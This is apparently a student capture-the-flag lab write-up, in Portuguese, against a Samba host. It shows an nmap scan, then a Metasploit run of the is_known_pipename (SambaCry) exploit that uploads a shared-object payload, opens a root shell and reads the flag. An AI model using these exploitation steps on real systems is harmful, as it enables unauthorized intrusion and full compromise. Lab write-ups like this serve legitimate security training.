># **Exploração 192.168.90.79**

Flag Capturada:

    CTF{6d344445cf04504cbb1e65f794153f3f}

>### **SCAN com nmap -sV :**

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-05 14:13 -03
    Nmap scan report for 192.168.90.79
    Host is up (0.0040s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    Service Info: Host: 102BAAPLOGEX; OS: Linux; CPE: cpe:/o:linux:linux_kernel

>### **Usando msfconsole para explorar a vulnerabilidade:**

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno/Downloads</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">msfconsole</font>          </pre>


<pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>linux/samba/is_known_pipename</b></font>) &gt; set RHOSTS 192.168.90.79
RHOSTS =&gt; 192.168.90.79
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>linux/samba/is_known_pipename</b></font>) &gt; set RPORT 445
RPORT =&gt; 445
</pre>


<pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>linux/samba/is_known_pipename</b></font>) &gt; run

<font color="#277FFF"><b>[*]</b></font> 192.168.90.79:445 - Using location \\192.168.90.79\102baaplogexdocs\ for the path
<font color="#277FFF"><b>[*]</b></font> 192.168.90.79:445 - Retrieving the remote path of the share &apos;102baaplogexdocs&apos;
<font color="#277FFF"><b>[*]</b></font> 192.168.90.79:445 - Share &apos;102baaplogexdocs&apos; has server-side path &apos;/home/suzi/suzishare
<font color="#277FFF"><b>[*]</b></font> 192.168.90.79:445 - Uploaded payload to \\192.168.90.79\102baaplogexdocs\bOmNyPVV.so
<font color="#277FFF"><b>[*]</b></font> 192.168.90.79:445 - Loading the payload from server-side path /home/suzi/suzishare/bOmNyPVV.so using \\PIPE\/home/suzi/suzishare/bOmNyPVV.so...
<font color="#EC0101"><b>[-]</b></font> 192.168.90.79:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND
<font color="#277FFF"><b>[*]</b></font> 192.168.90.79:445 - Loading the payload from server-side path /home/suzi/suzishare/bOmNyPVV.so using /home/suzi/suzishare/bOmNyPVV.so...
<font color="#47D4B9"><b>[+]</b></font> 192.168.90.79:445 - Probe response indicates the interactive payload was loaded...
<font color="#277FFF"><b>[*]</b></font> Found shell.
<font color="#277FFF"><b>[*]</b></font> Command shell session 1 opened (192.168.80.109:43187 -&gt; 192.168.90.79:445 ) at 2022-05-05 14:40:08 -0300

</pre>

>### **Navegando até a Flag:**

<pre>ls
systemd-private-b7b3329bef40405ebf1e4e187ad4f052-systemd-resolved.service-LX6tZ7
systemd-private-b7b3329bef40405ebf1e4e187ad4f052-systemd-timesyncd.service-6jdmPT
cd /root
ls
flag.txt
cat flag.txt
CTF{6d344445cf04504cbb1e65f794153f3f}
</pre>